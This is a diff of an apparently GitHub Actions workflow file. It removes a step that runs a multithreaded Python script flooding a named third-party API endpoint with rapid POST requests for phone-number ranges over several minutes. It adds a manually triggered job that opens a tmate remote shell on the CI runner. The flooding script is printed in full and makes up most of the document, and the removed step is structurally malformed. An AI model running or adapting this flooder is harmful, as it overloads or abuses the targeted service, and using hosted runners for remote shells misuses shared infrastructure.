@@ -1,72 +1,19 @@
-- name: Run ultra fast requester
-  env:
-    THREADS: ${{ github.event.inputs.threads || '30' }}
-    DELAY: ${{ github.event.inputs.delay || '0.003' }}
-    DURATION: ${{ github.event.inputs.duration || '5' }}
-  run: |
-    python << 'EOF'
-import requests
-import time
-import threading
-from concurrent.futures import ThreadPoolExecutor
-import os
+name: tmate session
 
-NUM_THREADS = int(os.getenv('THREADS', '30'))
-REQUEST_DELAY = float(os.getenv('DELAY', '0.003'))
-DURATION = int(os.getenv('DURATION', '5')) * 60
-TARGET_URL = 'https://mknetworkbd.com/API/api_handler.php'
-PHONE_RANGE = '9929876XXXXX'
+on:
+  workflow_dispatch:
 
-headers = {
-    'User-Agent': 'Mozilla/5.0',
-    'cookie': 'mk_lang=en;',
-    'Content-Type': 'application/x-www-form-urlencoded',
-}
+jobs:
+  tmate:
+    runs-on: ubuntu-latest
 
-data = {
-    'action': 'get_number',
-    'range': PHONE_RANGE
-}
+    steps:
+      - name: Update packages
+        run: sudo apt-get update
 
-request_count = 0
-success_count = 0
-error_count = 0
-lock = threading.Lock()
-start_time = time.time()
-running = True
+      - name: Install tmate
+        run: sudo apt-get install -y tmate
 
-def worker():
-    global request_count, success_count, error_count
-    session = requests.Session()
-    session.headers.update(headers)
-
-    while running:
-        try:
-            r = session.post(TARGET_URL, data=data, timeout=5)
-            with lock:
-                request_count += 1
-                if r.status_code == 200:
-                    success_count += 1
-                else:
-                    error_count += 1
-        except:
-            with lock:
-                error_count += 1
-                request_count += 1
-
-        time.sleep(REQUEST_DELAY)
-
-with ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
-    for _ in range(NUM_THREADS):
-        ex.submit(worker)
-
-    time.sleep(DURATION)
-    running = False
-
-elapsed = time.time() - start_time
-print("Done")
-print("Requests:", request_count)
-print("Success:", success_count)
-print("Errors:", error_count)
-print("RPS:", request_count / elapsed)
-EOF
+      - name: Start tmate session
+        run: |
+          tmate -F
